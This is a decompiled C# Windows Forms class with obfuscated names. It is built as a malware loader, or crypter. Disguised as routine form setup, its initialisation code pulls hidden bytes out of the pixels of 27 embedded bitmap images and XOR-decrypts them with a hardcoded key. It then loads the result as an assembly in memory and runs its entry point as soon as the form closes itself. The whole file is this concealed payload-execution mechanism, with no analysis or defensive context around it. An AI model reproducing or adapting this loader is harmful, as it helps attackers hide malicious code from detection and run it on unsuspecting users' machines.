using System;
using System.ComponentModel;
using System.Drawing;
using System.Drawing.Imaging;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using gSJcRpfceFAiw.Properties;

namespace gSJcRpfceFAiw;

public class fiqlFWZYgGyz : Form
{
	private delegate Assembly SWqquvuLkhFwgEUT(byte[] lNYgiDwINEFX);

	private IContainer components = null;

	private string[] sEvswmmftqT;

	private MethodInfo VpjudQJmTHln;

	private byte[] HkFsbeebwsLUW
	{
		get
		{
			Console.WriteLine();
			return new byte[14]
			{
				235, 18, 237, 184, 82, 63, 181, 107, 55, 25,
				207, 73, 30, 34
			};
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_019a: Unknown result type (might be due to invalid IL or missing references)
		//IL_01a0: Expected O, but got Unknown
		//IL_01d0: Unknown result type (might be due to invalid IL or missing references)
		((Control)this).SuspendLayout();
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(489, 199));
		((Control)this).set_Name("fiqlFWZYgGyz");
		((Control)this).set_Text("fiqlFWZYgGyz");
		((Form)this).add_Load((EventHandler)fiqlFWZYgGyz_Load);
		((Control)this).ResumeLayout(false);
		byte[] array = new byte[0];
		string[] array2 = new string[27]
		{
			"HhAydbbvYMwwBIVsU", "FGSAccBOWieTSIDK", "BsiWOJMpdyKUzCkPcLB", "sXhcRCjxgg", "vuPqqmieNSWow", "scsSXjHHFCw", "GBDmTXNMEQvXjafJNkQ", "chEmtPyBTQlGNtFph", "hIawRQMkxAeMJv", "bOvcdcCQqceoI",
			"ybrQQaYWdSwQFhPCZPV", "SvjGresuaUWll", "jfNmjsQHcSxDOZ", "fJldffHuhvbMFjZaOi", "hvVzyAYYqZxjx", "vzJoztiliPeLdFnJ", "GTjnxiAMWxxHQXu", "mbsHwEraGg", "fQnzxatPDtuX", "goTAFRUGCHYjfqmoWuP",
			"CUmrgMTvsxN", "UfALNyvsOnoS", "KipTQsNvGrmPQcF", "kRWJUGMjUpiPnbvnGnm", "QKAoqHFaapbNPfmXUX", "aiYNkrgNkUqCeCCRlYl", "LqHzbSpqaBWLYmnAWY"
		};
		string[] array3 = array2;
		foreach (string name in array3)
		{
			Bitmap val = (Bitmap)Resources.ResourceManager.GetObject(name);
			byte[] array4 = new byte[((Image)val).get_Width() * ((Image)val).get_Height() * 4];
			Rectangle rectangle = new Rectangle(0, 0, ((Image)val).get_Width(), ((Image)val).get_Height());
			BitmapData val2 = val.LockBits(rectangle, (ImageLockMode)3, ((Image)val).get_PixelFormat());
			Marshal.Copy(val2.get_Scan0(), array4, 0, array4.Length);
			byte[] array5 = new byte[BitConverter.ToInt32(array4, 0)];
			Array.Copy(array4, 4, array5, 0, array5.Length);
			val.UnlockBits(val2);
			Array.Resize(ref array, array.Length + array5.Length);
			Array.Copy(array5, 0, array, array.Length - array5.Length, array5.Length);
		}
		for (int j = 0; j < array.Length; j++)
		{
			for (int k = 0; k < HkFsbeebwsLUW.Length; k++)
			{
				array[j] = (byte)(array[j] ^ HkFsbeebwsLUW[k]);
			}
		}
		Assembly assembly = Assembly.Load(array);
		VpjudQJmTHln = assembly.EntryPoint;
	}

	public fiqlFWZYgGyz(string[] args)
	{
		sEvswmmftqT = args;
		InitializeComponent();
	}

	private void fiqlFWZYgGyz_Load(object sender, EventArgs e)
	{
		((Form)this).Close();
		VpjudQJmTHln.Invoke(null, new object[1] { sEvswmmftqT });
	}
}
